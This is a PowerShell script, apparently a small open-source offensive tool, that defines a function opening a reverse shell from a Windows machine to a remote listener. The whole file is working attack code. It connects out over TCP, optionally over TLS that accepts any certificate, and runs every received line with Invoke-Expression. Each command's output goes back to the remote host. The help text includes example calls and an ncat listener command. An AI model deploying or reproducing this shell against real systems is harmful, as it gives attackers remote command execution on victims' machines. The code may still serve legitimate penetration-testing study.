function Invoke-LameTinyRevShell {
    <#
        .SYNOPSIS
            Invoke-LameTinyRevShell - Reverse Shell for Windows with full STDOUT and limited STDERR redirection
            Author: lamesecguy
            License: BSD 3-Clauses
            Source: https://github.com/lamesecguy/LameTinyRevShells
        
        .DESCRIPTION
            Invoke-LameTinyRevShell - Reverse Shell for Windows with full STDOUT and limited STDERR redirection
            
            Establishes a reverse connection, executes user input lines as a PowerShell command, and redirects fully the Standard Output and partially the Standard Error streams from the PowerShell command to the remote receiver. That means the output on the remote receiver may not be exactly the same as it would be on the local shell.
            
            The receiver can be any netcat-like application that listens for a TCP connection, sends whatever is typed in the terminal and prints whatever is received on the screen.
            
            It is possible to have the reverse shell data tunneled with TLS. For example, The "ncat" tool supports natively listening to encrypted connections:
                ncat --ssl -lnp 4444
            
            
        .PARAMETER RemoteHost
            Remote host to receive the connection
        .PARAMETER RemotePort
            Remote port to receive the connection
        .PARAMETER Encrypt
            Encrypt the reverse TCP connection
            Default: "false"
            
        .EXAMPLE  
            PS C:\> Invoke-LameTinyRevShell 10.0.0.2 4444
            
            Description
            -----------
            Invoke a tiny reverse shell
            
         .EXAMPLE
            PS C:\> Invoke-LameTinyRevShell -RemoteHost 10.0.0.2 -RemotePort 4444 -Encrypt
            
            Description
            -----------
            Invoke a tiny reverse shell with an encrypted connection
            
    #>
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $RemoteHost,
        
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $RemotePort,

        [Parameter(Position = 2, Mandatory = $False)]
        [Switch]
        $Encrypt = $False
    )
    
    $NetSocket = New-Object System.Net.Sockets.TcpClient($RemoteHost, $RemotePort)
    If ($Encrypt) {
        $ClrStream = $NetSocket.GetStream()
        $NetStream = New-Object System.Net.Security.SslStream($ClrStream, $False, ({$True} -as [System.Net.Security.RemoteCertificateValidationCallback]))
        $NetStream.AuthenticateAsClient($Null)
    } Else {
        $NetStream = $NetSocket.GetStream()
    }
    
    $NetReader = New-Object System.IO.StreamReader($NetStream)
    $NetWriter = New-Object System.IO.StreamWriter($NetStream)
    $NetWriter.AutoFlush = $True
    
    $NetWriter.Write("PS "+(GL).Path+"> ")
    While($NetSocket.Connected -and ($InputBuf=$NetReader.ReadLine()) -and $InputBuf -inotmatch "(exit|quit)"){
    	try{$OutputBuf=(IEX -c $InputBuf *>&1)}catch{$OutputBuf=$_}
    	$OutputBuf|%{$NetWriter.WriteLine($_)}
    	$NetWriter.Write("PS "+(GL).Path+"> ")
    }

    $NetSocket.Close()
}

